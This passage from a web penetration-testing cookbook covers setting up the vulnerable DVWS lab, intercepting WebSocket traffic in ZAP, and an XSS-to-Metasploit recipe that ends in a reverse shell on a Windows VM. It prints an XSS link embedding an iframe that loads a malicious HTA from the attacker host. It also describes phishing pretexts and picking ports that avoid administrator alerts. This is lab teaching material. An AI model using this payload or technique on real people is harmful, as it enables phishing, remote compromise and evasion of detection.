    unnecessary ones:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/e3dea5d3-dc52-407c-bc75-be31ca4bfcc3.png)'
  prefs: []
  type: TYPE_IMG
- en: Also, check that the MySQL module is enabled in `php.ini` (`/etc/php/<php_version>/apache2/php.ini`).
    Look for the `Dynamic Extensions` section and enable (remove the preceding `;`)
    the `extension=mysqli` line.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, configure the database. First, start the MySQL service (`service mysql
    start`) and then the MySQL client (`mysql`) from the Terminal. Once in the MySQL
    prompt, create the DVWS database with `create database dvws_db;` and exit MySQL.
    When the database is created, we need to create its table structure. DVWS includes
    a script to do that, so execute the following in a Terminal: `mysql dvws_db <
    /var/www/html/DVWS/includes/dvws_db.sql` (assuming `/var/www/html/` is Apache''s
    document root directory):'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/4ffb91d5-562d-43d8-9541-2e114f775b87.png)'
  prefs: []
  type: TYPE_IMG
- en: As DVWS uses a predefined hostname, we need to fix a name resolution for that
    name to our local address, which is the one we will be using to test. Open `/etc/hosts`
    with your favorite text editor and add the line `127.0.0.1 dvws.local` to it.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, we can start our Apache service with `service apache2 start` and browse
    to `http://dvws.local/DVWS/`. Follow the instructions given there, including starting
    the WebSockets listener (`php ws-socket.php`), and run the `setup` script to finish
    configuring the database (`http://dvws.local/DVWS/setup.php`):'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/a13ab8e3-7f71-4ca6-a298-5c7b48fed8bb.png)'
  prefs: []
  type: TYPE_IMG
- en: Now, we are ready to continue.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We chose ZAP for this exercise as it can monitor, intercept, and repeat WebSockets
    messages. Burp Suite can monitor WebSockets communication; however, it doesn''t
    have the ability to intercept, modify, and replay messages:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Configure your browser to use ZAP as a proxy, and in ZAP, enable the WebSockets
    tab by clicking on the plus icon in the bottom panel:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/7c8c42e5-80ba-48df-87db-ec0546770f68.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, in the browser go to `http://dvws.local/DVWS/` and select Stored XSS from
    the menu:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/af5eae68-c4fc-4b09-affd-82b9580fda40.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Enter some comments and change to ZAP. In the History tab, look for for a request
    to `http://dvws.local:8080/post-comments`; this is the handshake to start the
    WebSockets session:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/6e0527f0-3659-4d08-850b-e9d35ef14c86.png)'
  prefs: []
  type: TYPE_IMG
- en: 'A request to initiate WebSockets communication includes the Sec-WebSocket-Key
    header followed by a base64 encoded value. This key is not an authentication mechanism;
    it only helps ensure that the server does not accept connections from non-WebSockets
    clients:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/4868c623-3d7e-4b27-a692-c77c28ec0be3.png)'
  prefs: []
  type: TYPE_IMG
- en: The server's response is a 101 Switching Protocols code that includes a header,
    `Sec-WebSocket-Accept`, with a key similar in purpose to the one used by the client.
  prefs: []
  type: TYPE_NORMAL
- en: 'In ZAP''s WebSockets tab, you can see that there are multiple communication
    channels, that is, multiple connections established and all messages have a direction
    (ingoing or outgoing), an opcode, and a payload, which is the information to be
    communicated:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/f6759ea3-aafb-4086-85d3-c435d1e01dbe.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To intercept WebSocket, add a breakpoint by clicking the break icon in the
    WebSockets tab. Select the Opcode, Channel, and Payload Pattern that needs to
    be matched to an intercept:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b52a5037-c70d-454b-9d9f-926687b47d4e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'When a breakpoint is hit, the message will be shown in the upper panel, like
    every other break in ZAP, but here we can alter the contents and send or discard
    the message:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b58eb621-f699-4905-b2e9-fe3cc46646b8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'ZAP also has the ability to replay/resend an existing message; right-click
    on any row in the WebSockets tab and select Open/Resend with Message Editor:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/96fe4476-14a1-4a06-8c3b-23be40840c06.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Then, we will see the WebSocket Message Editor window, where we can change
    all of the parameters of the message, including its direction and contents, and
    send it again:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/5360236f-73e8-460b-80d6-3fb0aa925e06.png)Most of the attacks and
    security weaknesses inherent in web applications can be replicated and exploited
    via WebSockets if the application is vulnerable.'
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: WebSockets communication is initiated by the client via the `WebSocket` class
    in JavaScript. When a WebSocket instance is created, the client starts the handshake
    with the server. When the server responds to the handshake and the connection
    is established, the HTTP connection is then replaced by the WebSocket connection,
    and it becomes a bidirectional binary protocol not necessarily compatible with
    HTTP.
  prefs: []
  type: TYPE_NORMAL
- en: 'WebSockets is plain text, as is HTTP. The server will still require you to
    implement HTTPS to provide an encrypted layer. If we sniff the communication in
    the previous exercise with Wireshark, we can easily read the message:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/1114f8a7-adc4-423d-944d-2290e587ca14.png)'
  prefs: []
  type: TYPE_IMG
- en: Notice how the messages sent by the client are masked (not encrypted) and the
    ones from the server are in clear text; this is part of the protocol definition
    for RFC 6455 ([http://www.rfc-base.org/txt/rfc-6455.txt](http://www.rfc-base.org/txt/rfc-6455.txt)).
  prefs: []
  type: TYPE_NORMAL
- en: Using XSS and Metasploit to get a remote shell
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In previous chapters, we have seen that XSS can be used by an attacker to extract
    user information or perform actions on the user's behalf within the application's
    scope. However, with a little more effort and some well-executed social engineering
    labor, an attacker can use XSS to convince the user to download and execute malicious
    software that can be used to compromise their client computer and gain further
    access to the local network.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will see a proof of concept for a more elaborated XSS attack
    that will conclude with the attacker being able to remotely execute commands on
    the victim's computer.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: For this recipe, we will use BodgeIt from the vulnerable VM `vm_1` as the exploited
    application. We will also need a separate client virtual machine, for the sake
    of clarity. In this recipe, we will add a Windows 7 virtual machine to our laboratory.
  prefs: []
  type: TYPE_NORMAL
- en: If you don't have a Windows VM already configured, Microsoft has various setups
    available for developers to test their applications in its Internet Explorer and
    Edge browsers; you can download them from [https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/).
    For this recipe, we will use Windows 7 with IE 8\. Feel free to try it in any
    other version; it should work with some minor changes in architecture and OS settings.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'What we are going to do is to use XSS to make the browser open and execute
    a malicious HTA file hosted in our Kali VM:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First, let''s set up the server. Open the Metasploit console:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: 'Once it''s started, execute the following commands to load the exploit module
    and payload:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'Now, our server will listen on port `8888`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: 'And the listener for the reverse connection, once the payload is executed,
    will be on port `12345`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: '![](assets/14d5ed1b-11be-4b98-bc7b-c1f9c5b490d8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, we run the exploit and wait for a client to connect:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: '![](assets/361113ad-f065-4230-9b9f-d15c607dc342.png)'
  prefs: []
  type: TYPE_IMG
- en: Notice the information given by the server when it starts. The Local IP value
    tells us how to access the malicious HTA file, whose name is a random string with
    the extension `.hta` (`k0Pjsl1tz2cI3Mm.hta` in this case).
  prefs: []
  type: TYPE_NORMAL
- en: Now, go to the Windows VM, our client, and open Internet Explorer.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Suppose the attacker sends a phishing email containing a link to `http://192.168.56.11/bodgeit/search.jsp?q=t<iframe
    src="http://192.168.56.10:8888/k0Pjsl1tz2cI3Mm.hta"></iframe>` to the victim.
    Open that link in Internet Explorer.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If the pretext in the email and the XSS attack are good, the user will accept
    the warnings and will download and execute the file. Accept the download of the
    file in IE:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/209f1b00-be17-484c-9ff8-4e9fbcd87750.png)'
  prefs: []
  type: TYPE_IMG
- en: 'When prompted to Run, Save, or Cancel, run the HTA file:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now, let''s go back to the attacking side. Go to Kali and check the terminal
    that has the exploit running; it should have received the requests and sent the
    payload:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9a7e5b68-f119-4bc1-86af-301b89a8aa2e.png)'
  prefs: []
  type: TYPE_IMG
- en: Notice how Metasploit says it has a new session opened, in our case with the
    number `2`. Use the `sessions` command to see the details.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'To interact with session number `2`, use `sessions -i 2`. You will be in a
    Windows Command Prompt; issue some Windows commands to verify that it is actually
    the victim machine:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9137ce1d-a36d-4927-9085-f38b2c59c57e.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '**HTA** stands for **HTML Application**, which is a format that allows for
    the execution of code within a web browser but without the constraints of the
    browser security model; it is like running a fully trusted application, like the
    browser itself or MS Word.'
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we used Metasploit to generate a malicious HTA file and set
    up a server to host it. Our malicious file contained a reverse shell; a reverse
    shell is a program that, when executed by the victim, will establish a connection
    back to the attacker's server (that's why it is called **reverse**), as opposed
    to opening a port in the victim to wait for an incoming connection. When this
    connection is completed, a command execution session (a remote shell) is established.
  prefs: []
  type: TYPE_NORMAL
- en: We arbitrarily picked port `8888` for our server and port `12345` for the exploit
    listener. In a real-world scenario, maybe port `80` or `443` with proper TLS configuration
    would be more convenient, as those are the common ports for HTTP communication
    and the shell exploit would require a more advanced setup, including encrypted
    communication and maybe the use of another port that doesn't raise alerts when
    communication is detected by an administrator. SSH port `22` is a good choice.
  prefs: []
  type: TYPE_NORMAL
- en: In this attack, XSS is only the method used to load the malicious file into
    the victim machine; it also assumes that the attacker will create a convincing
    social engineering scenario so that the file is accepted and executed.
  prefs: []
  type: TYPE_NORMAL
